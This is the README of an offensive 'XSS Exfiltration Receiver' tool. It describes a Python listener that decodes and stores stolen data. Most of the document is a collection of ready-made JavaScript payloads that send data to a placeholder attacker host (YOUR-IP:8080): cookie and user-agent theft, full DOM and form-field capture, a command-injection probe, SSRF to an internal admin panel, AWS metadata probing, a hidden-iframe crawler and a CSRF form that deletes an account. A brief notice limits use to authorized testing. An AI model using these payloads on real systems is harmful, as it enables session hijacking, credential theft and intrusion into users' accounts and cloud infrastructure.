

# 🕵️ XSS Exfiltration Receiver ( Lite Edition )

A lightweight HTTP server to capture, decode, and store exfiltrated data from XSS payloads via URL query parameters or POST bodies. 
Supports recursive Base64 and URL decoding, automatic HTML detection, and file storage.

## 📦 Contents

```

xss\_receiver/
├── receiver__.py       # Python3 receiver server (GET/POST + decoder)
├── decoded\_html/    # Output folder for saved HTML payloads
└── README.md        # This file

````

---

## 🚀 Getting Started

### 1. Start the Receiver

```bash
python3 receiver__.py --port 8080 --show
````

| Flag     | Description                                    |
| -------- | ---------------------------------------------- |
| `--port` | Port to listen on (default: `80`)              |
| `--show` | Display decoded HTML in terminal (if detected) |

---

### 2. Use with a Payload

You can exfiltrate Base64-encoded content to this server via:

#### ➤ GET Example

```html
<img src="http://YOUR-IP:8080/?data=BASE64_ENCODED_PAYLOAD">
```

#### ➤ POST Example

```javascript
fetch("http://YOUR-IP:8080/", {
  method: "POST",
  body: "data=BASE64_ENCODED_PAYLOAD"
});
```

---

## 💡 Features

* 🔁 Recursive decoding of Base64 and URL-encoded strings (up to 5 layers)
* 🧠 HTML auto-detection via `<html>` / `<!doctype>` tags
* 💾 Saves decoded HTML to `decoded_html/` folder with timestamped filenames
* 👁️ Optional real-time display of decoded payloads
* ✅ Supports both `GET` (query param) and `POST` (form body) exfiltration

---

## 🗂️ Output

| Output Type           | Description                              |
| --------------------- | ---------------------------------------- |
| `decoded_html/*.html` | Decoded HTML payloads (auto-detected)    |
| (stdout)              | Decoding layers, final preview, warnings |

---

## 🧪 Example Payloads

```javascript
// DOM Exfiltration
fetch("http://YOUR-IP:8080/?data=" + btoa(document.documentElement.outerHTML));

// Cookie Theft
fetch("http://YOUR-IP:8080/?data=" + btoa(document.cookie));
```

##
##

#### 🔍 Full DOM Extraction

```javascript
fetch("http://YOUR-IP:8080/?data=" + btoa(document.documentElement.outerHTML));
```

#### 🍪 Cookie + User-Agent Theft

```javascript
fetch("http://YOUR-IP:8080/?data=" + btoa(document.cookie + ' | ' + navigator.userAgent));
```

#### 🌐 Internal IP Address Leak

```javascript
fetch("http://YOUR-IP:8080/?data=" + btoa(location.href + ' | ' + location.hostname));
```

#### 🧬 DOM Form Field Enumeration

```javascript
let inputs = [...document.querySelectorAll('input')].map(i => `${i.name}=${i.value}`).join('&');
fetch("http://YOUR-IP:8080/?data=" + btoa(inputs));
```

#### 🕳️ Blind Command Injection Probe (API param)

```javascript
fetch("/api/status", {
  method: "POST",
  body: JSON.stringify({ host: "127.0.0.1; id" }),
  headers: { "Content-Type": "application/json" }
})
.then(r => r.text())
.then(t => fetch("http://YOUR-IP:8080/?data=" + btoa(t)));
```

#### 🪝 CSRF Auto-Submit Form

```javascript
let f = document.createElement("form");
f.method = "POST";
f.action = "/account/delete";
document.body.appendChild(f);
f.submit();
```

#### 🕸️ Accessing Internal Admin Panel (SSRF Style)

```javascript
fetch("http://127.0.0.1/admin").then(r => r.text())
  .then(txt => fetch("http://YOUR-IP:8080/?data=" + btoa(txt)));
```

#### ☁️ Cloud Metadata Service Probing (AWS)

```javascript
fetch("http://169.254.169.254/latest/meta-data/hostname")
  .then(r => r.text())
  .then(data => fetch("http://YOUR-IP:8080/?data=" + btoa(data)));
```

#### ⚠️ JavaScript Error Beacon

```javascript
window.onerror = (msg, url, line, col, err) => {
  fetch("http://YOUR-IP:8080/?data=" + btoa(`${msg} at ${url}:${line}:${col}`));
};
```

#### 🧭 Hidden Iframe Crawler

```javascript
let ifr = document.createElement("iframe");
ifr.src = "/hidden/config";
ifr.onload = () => {
  try {
    let d = ifr.contentDocument || ifr.contentWindow.document;
    fetch("http://YOUR-IP:8080/?data=" + btoa(d.body.innerText));
  } catch (e) {}
};
document.body.appendChild(ifr);
```

---



## 🔐 Security Notice

This tool is intended for **authorized testing and education only**. Do not use against systems without **explicit written permission**. Follow ethical guidelines and all legal regulations in your jurisdiction.

---

## 🛠 TODO (Optional Future Features)

* Add JSON output support (e.g., `--json-log`)
* Add IP filtering and allowlists
* Add Slack/Webhook alerts
* Add live HTML replay view in browser

---

## 👨‍💻 Author Notes

This is a simplified version of a more feature-rich receiver/payload suite. 
Designed to be easy to run and inspect in minimal environments. For more advanced use cases, see the full version (coming soon).

Built with ❤️ by security researchers, for security researchers.



